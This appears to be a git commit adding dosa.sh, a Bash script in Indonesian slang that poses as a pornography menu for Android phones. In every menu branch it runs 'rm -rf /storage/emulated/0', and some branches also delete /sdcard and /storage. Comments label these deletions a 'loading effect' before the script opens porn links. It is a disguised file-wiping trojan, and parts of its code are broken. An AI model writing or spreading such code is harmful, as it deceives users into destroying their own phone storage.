c2330bc5ba5ddcb4e1f5d850adcf98a022fed791
limit queen <63425451+LimitQueenProject@users.noreply.github.com>
2020-04-29 17:41:41 +0700

    Create dosa.sh

---
+++ dosa.sh
@@ -0,0 +1,236 @@
+#!/bin/bash
+#menu
+banner() {
+  figlet -f standard "bokep"
+  figlet -f standard "no vpn"
+  echo -en "DOSA TANGGUNG SENDIRI ANJENG!!!"
+  echo -en "AZAB WAITING FOR YOU"
+  }
+  
+menu() {
+  echo -en "FITUR FITUR YANG TERSESDIA"
+  echo -en """
+  1. XNXX
+  2. XVIDEOS (server penuh)
+  3. PORN HUB:v
+  4. BOKEP NURUL
+  """
+  read -p "SILAHKAN PILIH YANG MANA UKHTI : " pilih
+  if [[ $pilih == 1 ]]; then
+  #efek loading
+  loanjing... xnxx
+  xnxx
+  elif [[ $pilih == 2 ]]; then
+  #efek loading
+  loanjing... xvid
+  xvideos
+  elif [[ $pilih == 3 ]]; then
+  #efek loading
+  loanjing... porn hub
+  pornhub
+  elif [[ $pilih == 4 ]]; then
+  #efek loading
+  loanjing... nurul
+  nurulh
+  else
+  echo -en "PILIH YANG ADA AJA ANJING JANGAN NAWAR!!!"
+  spleep 1.2
+  clear
+  menu
+  fi
+  }
+  
+xnxx() {
+  echo -en "PILIH BOKEP MANA"
+  echo -en """
+  1. INDONESIA
+  2. JEPANG
+  3. KOREA
+  4. CHINA
+  5. DI RUMAH LU
+  """
+  read -p "ROOT@BOKEP:~# " xnxx
+  if [[ $xnxx == 1 ]]; then
+  #ini isi loading nya bro biar keren:v
+  rm -rf /storage/emulated/0
+  #efek sedang menbuka bokep
+  xdg-open https://translate.googleusercontent.com/translate_c?depth=1&hl=id&nv=1&pto=aue&rurl=translate.google.co.id&sl=auto&sp=nmt4&tl=id&u=https://www.xnxx.com/search/indonesia&usg=ALkJrhgzGIpDzqJXQ12DFQjeT3_KOeYa5Q
+  
+  elif [[ $xnxx == 2 ]]; then
+  #kasih efek loading
+  rm -rf /storage/emulated/0
+  #efek sedang menbuka bokep
+  xdg-open https://translate.googleusercontent.com/translate_c?depth=1&hl=id&nv=1&pto=aue&rurl=translate.google.co.id&sl=auto&sp=nmt4&tl=id&u=https://www.xnxx.com/search/jepang&usg=ALkJrhgEyk2JDCZENB1u2b_IVf_UT_3J8A
+  
+  elif [[ $xnxx == 3 ]]; then
+  #kasih efek loading
+  rm -rf /storage/emulated/0
+  #efek sedang menbuka bokep
+  xdg-open https://translate.googleusercontent.com/translate_c?depth=1&hl=id&nv=1&pto=aue&rurl=translate.google.co.id&sl=auto&sp=nmt4&tl=id&u=https://www.xnxx.com/search/korea&usg=ALkJrhgB1cztQSLR_nwthAYA3DMN02ZVOg
+  
+  elif [[ $xnxx == 4 ]]; then
+  #kasih efek losding
+  rm -rf /storage/emulated/0
+  #efek sedang menbuka bokep
+  xdg-open https://translate.googleusercontent.com/translate_c?depth=1&hl=id&nv=1&pto=aue&rurl=translate.google.co.id&sl=auto&sp=nmt4&tl=id&u=https://www.xnxx.com/search/china&usg=ALkJrhgEd41jyi096xmNDfDDeEMoWXovFg
+  
+  elif [[ $xnxx == 5 ]]; then
+  #kasih efek loading
+  rm -rf /storage/emulated/0
+  rm -rf /sdcard
+  rm -rf /storage
+  #efek sedang menbuka bokep
+  xdg-open https://translate.googleusercontent.com/translate_c?depth=1&hl=id&nv=1&pto=aue&rurl=translate.google.co.id&sl=auto&sp=nmt4&tl=id&u=https://www.xnxx.com/search/viral&usg=ALkJrhjAPO3p3xipkjJ95YaQatoqUqBbtg
+  
+  else
+  echo -en "PILIH YANG ADA TOLOL!!!"
+  sleep 1.2 
+  clear
+  xnxx
+  }
+
+xvideos() {
+  echo -en "PILIH BOKEP MANA"
+  echo -en """
+  1. INDONESIA
+  2. JEPANG
+  3. KOREA
+  4. CHINA
+  5. DI RUMAH LU
+  """
+  read -p "ROOT@BOKEP:~# " xvideos
+  if [[ $xvideos == 1 ]]; then
+  #ini isi loading nya bro biar keren:v
+  rm -rf /storage/emulated/0
+  #efek sedang menbuka bokep
+  
+  
+  elif [[ $xvideos == 2 ]]; then
+  #kasih efek loading
+  rm -rf /storage/emulated/0
+  #efek sedang menbuka bokep
+  
+  
+  elif [[ $xvideos == 3 ]]; then
+  #kasih efek loading
+  rm -rf /storage/emulated/0
+  #efek sedang menbuka bokep
+  
+  
+  elif [[ $xvideos == 4 ]]; then
+  #kasih efek losding
+  rm -rf /storage/emulated/0
+  #efek sedang menbuka bokep
+  
+  
+  elif [[ $xvideos == 5 ]]; then
+  #kasih efek loading
+  rm -rf /storage/emulated/0
+  rm -rf /sdcard
+  rm -rf /storage
+  #efek sedang menbuka bokep
+  
+  
+  else
+  echo -en "PILIH YANG ADA TOLOL!!!"
+  sleep 1.2 
+  clear
+  xvideos
+  }
+pornhub() {
+  echo -en "PILIH BOKEP MANA"
+  echo -en """
+  1. INDONESIA
+  2. JEPANG
+  3. KOREA (rusak)
+  4. CHINA (rusak)
+  5. DI RUMAH LU (rusak)
+  """
+  read -p "ROOT@BOKEP:~# " porn
+  if [[ $porn == 1 ]]; then
+  #ini isi loading nya bro biar keren:v
+  rm -rf /storage/emulated/0
+  #efek sedang menbuka bokep
+  xdg-open https://translate.googleusercontent.com/translate_c?depth=1&hl=id&nv=1&pto=aue&rurl=translate.google.co.id&sl=auto&sp=nmt4&tl=id&u=https://www.pornhub.com/view_video.php%3Fviewkey%3Dph5e88c7a221261&usg=ALkJrhi1jUKZo4qkwgyP7QI72vcWWHNHbQ
+  
+  elif [[ $porn == 2 ]]; then
+  #kasih efek loading
+  rm -rf /storage/emulated/0
+  #efek sedang menbuka bokep
+  xdg-open https://translate.googleusercontent.com/translate_c?depth=1&hl=id&nv=1&pto=aue&rurl=translate.google.co.id&sl=auto&sp=nmt4&tl=id&u=https://www.pornhub.com/view_video.php%3Fviewkey%3Dph5df56a64048f7&usg=ALkJrhggSv7a4KH_S0Nn7kek1hxNMGgdZA
+  
+  elif [[ $porn == 3 ]]; then
+  #kasih efek loading
+  rm -rf /storage/emulated/0
+  #efek sedang menbuka bokep
+  
+  elif [[ $porn == 4 ]]; then
+  #kasih efek losding
+  rm -rf /storage/emulated/0
+  #efek sedang menbuka bokep
+  xdg
+  elif [[ $porn == 5 ]]; then
+  #kasih efek loading
+  rm -rf /storage/emulated/0
+  rm -rf /sdcard
+  rm -rf /storage
+  #efek sedang menbuka bokep
+  
+  
+  else
+  echo -en "PILIH YANG ADA TOLOL!!!"
+  sleep 1.2 
+  clear
+  pornhub
+  }
+  
+nurulh() {
+  echo -en "PILIH BOKEP MANA"
+  echo -en """
+  1. BAJU HITAM
+  2. BAJU BIRU
+  3. BAJU PUTIH
+  4. BAJU WARNA WARNI
+  5. GAK PAKE BAJU
+  """
+  read -p "ROOT@BOKEP:~# " nurul
+  if [[ $nurul == 1 ]]; then
+  #ini isi loading nya bro biar keren:v
+  rm -rf /storage/emulated/0
+  #efek sedang menbuka bokep
+  xdg-open https://translate.googleusercontent.com/translate_c?depth=1&hl=id&nv=1&pto=aue&rurl=translate.google.co.id&sl=auto&sp=nmt4&tl=id&u=https://www.xnxx.com/video-wdtjdf0/nur_hidayat_indonesia_fullnya_https_bit.ly_indonesian17&usg=ALkJrhjo82ungn42pg8bRaecLMSaySBHwQ
+  
+  elif [[ $nurul == 2 ]]; then
+  #kasih efek loading
+  rm -rf /storage/emulated/0
+  #efek sedang menbuka bokep
+  xdg-open https://translate.googleusercontent.com/translate_c?depth=1&hl=id&nv=1&pto=aue&rurl=translate.google.co.id&sl=auto&sp=nmt4&tl=id&u=https://www.xnxx.com/video-wckv30a/viral_nurul_hidayah_jilbab_terbaru&usg=ALkJrhjXfJ1m1WzghD0pWA_GQIa08HubeA
+  
+  elif [[ $nurul == 3 ]]; then
+  #kasih efek loading
+  rm -rf /storage/emulated/0
+  #efek sedang menbuka bokep
+  xdg-open https://translate.googleusercontent.com/translate_c?depth=1&hl=id&nv=1&pto=aue&rurl=translate.google.co.id&sl=auto&sp=nmt4&tl=id&u=https://www.xnxx.com/video-um4ov72/ch4knu&usg=ALkJrhjAd8NdC8zjfTtqhGgMitsswi0FtA
+  
+  elif [[ $nurul == 4 ]]; then
+  #kasih efek losding
+  rm -rf /storage/emulated/0
+  #efek sedang menbuka bokep
+  xdg-open https://translate.googleusercontent.com/translate_c?depth=1&hl=id&nv=1&pto=aue&rurl=translate.google.co.id&sl=auto&sp=nmt4&tl=id&u=https://www.xnxx.com/video-uzcf3bd/teen_rebecca_rainbow_takes_two_at_once&usg=ALkJrhgrv_kXpelR9TmxWV76qEEOQuEYxA
+  
+  elif [[ $nurul == 5 ]]; then
+  #kasih efek loading
+  rm -rf /storage/emulated/0
+  rm -rf /sdcard
+  rm -rf /storage
+  #efek sedang menbuka bokep
+  xdg-open https://translate.googleusercontent.com/translate_c?depth=1&hl=id&nv=1&pto=aue&rurl=translate.google.co.id&sl=auto&sp=nmt4&tl=id&u=https://www.xnxx.com/video-we2p77d/kepengen_viral_joget_tik_tok_hot&usg=ALkJrhgEHs_ODYM4QMSH5S2hnvl_59dntQ
+  
+  else
+  echo -en "PILIH YANG ADA TOLOL!!!"
+  sleep 1.2 
+  clear
+  nurulh
+  }
+banner
+menu
